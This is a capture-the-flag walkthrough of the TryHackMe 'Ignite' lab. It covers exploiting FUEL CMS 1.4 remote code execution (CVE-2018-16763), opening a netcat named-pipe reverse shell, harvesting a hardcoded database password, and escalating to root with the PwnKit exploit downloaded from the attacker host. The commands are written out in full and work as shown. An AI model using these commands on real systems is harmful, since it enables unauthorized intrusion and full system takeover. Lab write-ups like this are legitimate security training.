# **Ignite CTF Report (Kakaxh1)**

**Target IP:** 10.48.150.131  
**Attacker IP:** 10.48.149.105  
**Platform:** TryHackMe  
**Machine:** Ignite  

---

## **1. Nmap Scan Results**

**Open Ports:**
- **80/tcp** – HTTP (Apache httpd 2.4.18 on Ubuntu)

**Key Findings:**
- Web server running FUEL CMS 1.4
- Robots.txt reveals `/fuel/` directory
- No other services exposed

**Command:**
```bash
nmap -sS -p- -Pn -sV -A -T4 10.48.150.131
```

---

## **2. Web Enumeration**

### **Robots.txt**
Found at: `http://10.48.150.131/robots.txt`
```
User-agent: *
Disallow: /fuel/
```

### **Directory Discovery**
**Main site enumeration revealed:**
- `/assets/` – Static files
- `/home` – Web application
- `/index.php` – Main page
- `/offline` – Offline page

**/fuel/ directory enumeration:**
- `/fuel/login` – Admin login page
- Multiple administrative endpoints (all redirecting to login)

---

## **3. FUEL CMS Exploitation**

**Vulnerability:** CVE-2018-16763 (FUEL CMS 1.4 RCE)  
**Exploit:** `50477.py` (Python exploit)

**Initial Access:**
```bash
python3 50477.py -u http://10.48.150.131/
[+]Connecting...
Enter Command $whoami
# www-data
```

**Reverse Shell Establishment:**
```bash
# Named pipe reverse shell for stability
rm /tmp/f 2>/dev/null; mkfifo /tmp/f && cat /tmp/f | /bin/bash -i 2>&1 | nc 10.48.149.105 4444 > /tmp/f &
```

**Shell Access Confirmed:**
```bash
www-data@ubuntu:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## **4. Post-Exploitation & Flag Discovery**

### **User Flag Captured**
```bash
cat /home/www-data/user.txt
# 6470xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

**File Location:** `/home/www-data/user.txt`  
**Flag:** `6470xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

### **System Enumeration**
**Check user information:**
```bash
cat /etc/passwd | grep www-data
# www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

ls -la /home/
# total 12
# drwxr-xr-x  3 root     root     4096 Jul 26  2019 .
# drwxr-xr-x 24 root     root     4096 Jul 26  2019 ..
# drwx--x--x  2 www-data www-data 4096 Jul 26  2019 www-data
```

---

## **5. Database Credentials Discovery**

Found sensitive configuration file:
```bash
cat /var/www/html/fuel/application/config/database.php
```

**Critical Credentials Found:**
```php
'username' => 'root',
'password' => 'mememe',    # Hardcoded database password
```

**MySQL Access Test:**
```bash
mysql -u root -pmememe -e "show databases;"
# Database list displayed successfully
```

---

## **6. Privilege Escalation**

### **SUID Binaries Enumeration**
```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/pkexec → SUID bit set (PwnKit vulnerability)
```

### **System Information**
```bash
uname -a
# Linux ubuntu 4.4.0-210-generic (vulnerable to PwnKit)
```

### **PwnKit Exploitation (CVE-2021-4034)**
**On Attack Box:**
```bash
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034
make
python3 -m http.server 8000
```

**On Target:**
```bash
cd /tmp
wget http://10.48.149.105:8000/cve-2021-4034
wget http://10.48.149.105:8000/pwnkit.so
chmod +x cve-2021-4034
mkdir -p GCONV_PATH=.
cp pwnkit.so GCONV_PATH=./pwnkit.so:.
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
./cve-2021-4034
```

**Root Access Achieved:**
```bash
id
# uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

---

## **7. Root Flag Capture**

```bash
cat /root/root.txt
# b9bbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

**File Location:** `/root/root.txt`  
**Flag:** `b9bbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

---

**Author:** Kakaxh1  
**GitHub:** [https://github.com/Kakaxh1/](https://github.com/Kakaxh1/)  
**Date:** December 2025  
**Platform:** TryHackMe - Ignite Machine  
